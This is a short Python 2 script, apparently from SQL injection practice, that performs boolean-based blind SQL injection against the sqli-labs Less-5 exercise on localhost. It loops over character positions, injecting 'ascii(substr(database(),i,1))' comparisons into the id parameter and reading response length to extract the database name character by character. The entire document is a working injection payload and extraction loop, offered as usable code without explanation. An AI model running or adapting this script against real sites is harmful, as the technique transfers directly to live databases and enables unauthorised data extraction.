#coding=utf-8
#爆数据库名字
import requests
chuan='#ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz'
url='http://127.0.0.1/sqli-labs-master/Less-5/?id=1'
a=requests.get(url)
flag=''
#print a.text
#print len(a.text)
for i in range(1,9):
    for j in chuan:
        con=r"%27and ascii(substr(database(),{0},1))>'{1}'%23".format(i,ord(j))
        newurl=url+con
        a=requests.get(newurl)
        #print newurl
        #print len(a.text)
        #print j
        if(len(a.text)>704):
            #print newurl
            print j
            flag+=j
            #print flag
            break
print flag

